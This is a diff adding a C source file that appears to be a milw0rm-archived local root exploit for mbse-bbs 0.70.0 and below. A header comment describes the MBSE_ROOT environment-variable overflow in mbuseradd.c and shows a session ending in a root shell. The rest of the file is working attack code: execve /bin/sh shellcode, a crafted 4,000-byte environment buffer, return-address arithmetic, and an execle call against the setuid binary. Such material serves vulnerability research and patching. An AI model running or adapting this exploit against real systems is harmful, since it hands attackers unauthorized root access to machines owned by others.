@@ -1,0 +1,61 @@
+/* GNU/Linux mbse-bbs 0.70.0 & below stack overflow exploit
+ * ========================================================
+ * Multiple overflow conditions occur within mbse-bbs versions 0.70.0 & below.
+ * The current version of mbse-bbs does not contain these weaknesses. 
+ * Exploitation of these vulnerabilities can facilitate a privilege escalation
+ * attack in which an unprivileged user becomes root. Exploit calculates
+ * return address where ASLR is not in use. Vulnerable code is shown below;
+ * 
+ * matthew@localhost ~/foo/mbsebbs-0.70.0/unix $  cat -n mbuseradd.c 
+ * ...
+ * 177          shell   = calloc(PATH_MAX, sizeof(char));
+ * ...
+ * 228          sprintf(shell, "%s/bin/mbsebbs", getenv("MBSE_ROOT"));
+ * 
+ * (heap corruption in 0.33.17/stack overflow in others).
+ * *** glibc detected *** free(): invalid next size (normal): 0x0804e068 ***
+ *
+ * Example Usage.
+ *  matthew@localhost ~ $ id
+ *  uid=1000(matthew) gid=100(users) groups=10(wheel),100(users)
+ *  matthew@localhost ~ $ ./prdelka-vs-GNU-mbsebbs /opt/mbse/bin/mbuseradd
+ *  [ GNU/Linux mbse-bbs 0.70.0 & below stack overflow exploit
+ *  [ Using return address 0xbfffefd8
+ *  sh-3.1# id
+ *  uid=0(root) gid=1(bin) groups=10(wheel),100(users)
+ * 
+ * - prdelka
+ */
+#include <stdio.h>
+#include <stdlib.h>
+
+char shellcode[]="\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90"
+                 "\x31\xc0\x50\x68""//sh""\x68""/bin""\x89\xe3"
+                 "\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";
+
+int main(int argc,char* argv[]) {
+        int i;
+        long eip = 0x41414141;
+	char envh[]="MBSE_ROOT=";
+	printf("[ GNU/Linux mbse-bbs 0.70.0 & below stack overflow exploit\n");
+        if(argc < 2) {
+                printf("Error: [path]\n");
+                exit(0);
+        }
+        char* buffer = malloc(strlen(envh) + 4085 + sizeof(eip));
+	strcpy(buffer,envh);
+        long ptr = (long)buffer;	
+        for(i = 1;i <= 4061;i++){
+                strncat(buffer,"A",1);
+        }
+        ptr = ptr + 4061;
+        memcpy((char*)ptr,(char*)&eip,4);
+        eip = 0xc0000000 -4 -strlen(argv[1]) -1 -strlen(buffer) -1 -strlen(shellcode) -1;
+        memcpy((char*)ptr,(char*)&eip,4);
+        char *env[] = {buffer,NULL};
+        printf("[ Using return address 0x%x\n",eip);
+        execle(argv[1],argv[1],"x","x","x",shellcode,NULL,env);
+        exit(0);
+}
+
+// milw0rm.com [2007-01-18]
